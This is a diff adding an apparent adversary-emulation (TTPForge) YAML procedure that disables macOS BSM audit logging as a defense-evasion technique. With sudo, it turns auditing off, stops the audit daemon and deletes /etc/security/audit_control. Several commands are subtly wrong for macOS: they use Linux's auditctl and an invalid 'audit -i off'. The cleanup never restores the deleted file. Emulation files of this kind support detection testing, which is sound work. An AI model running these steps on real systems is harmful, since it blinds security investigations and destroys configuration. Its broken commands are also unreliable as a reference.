@@ -1,0 +1,80 @@
+id: 013-disable-audit-logging
+name: Disable Audit Logging
+description: Disable macOS audit logging (BSM) to prevent activity recording
+author: TTPForge
+created_date: 2026-01-30
+last_modified_date: 2026-01-30
+api_version: 2.0
+platforms:
+  - darwin
+tactics:
+  - defense_evasion
+techniques:
+  - disable_or_modify_security_tools
+
+requirements:
+  platforms:
+    - os: darwin
+  superuser: true
+
+args:
+  disable:
+    description: Disable audit logging
+    type: bool
+    default: false
+  status_only:
+    description: Only check status without disabling
+    type: bool
+    default: true
+
+steps:
+  check_audit_status:
+    inline: sudo auditctl -l | head -5
+    description: Check current audit logging status
+
+  check_audit_daemon:
+    inline: sudo launchctl list | grep -i audit
+    description: Check if audit daemon is running
+
+  disable_audit:
+    inline: sudo audit -i off
+    description: Disable audit logging
+    condition: "{{ args.disable }}"
+
+  stop_audit_daemon:
+    inline: sudo launchctl stop com.apple.auditd
+    description: Stop audit daemon
+    condition: "{{ args.disable }}"
+
+  remove_audit_rules:
+    inline: sudo rm -f /etc/security/audit_control 2>/dev/null || true
+    description: Remove audit configuration
+    condition: "{{ args.disable }}"
+
+checks:
+  audit_disabled:
+    inline: sudo auditctl -l 2>/dev/null | grep -q "0 rules" || [ ! -f /etc/security/audit_control ]
+    expected_exit_code: 0
+    description: Verify audit logging is disabled
+
+tests:
+  default:
+    steps:
+      - check_audit_status
+    expected_exit_code: 0
+
+  dry_run:
+    steps:
+      - check_audit_status
+    expected_exit_code: 0
+
+cleanup:
+  restore_audit:
+    inline: sudo audit -i on && sudo launchctl start com.apple.auditd
+    description: Re-enable audit logging and daemon
+
+notes:
+  - Audit logging is BSM (Basic Security Module) based
+  - Disabling audit leaves evidence in system logs
+  - Some audit functionality cannot be disabled with SIP enabled
+  - Audit trail is essential for security investigations
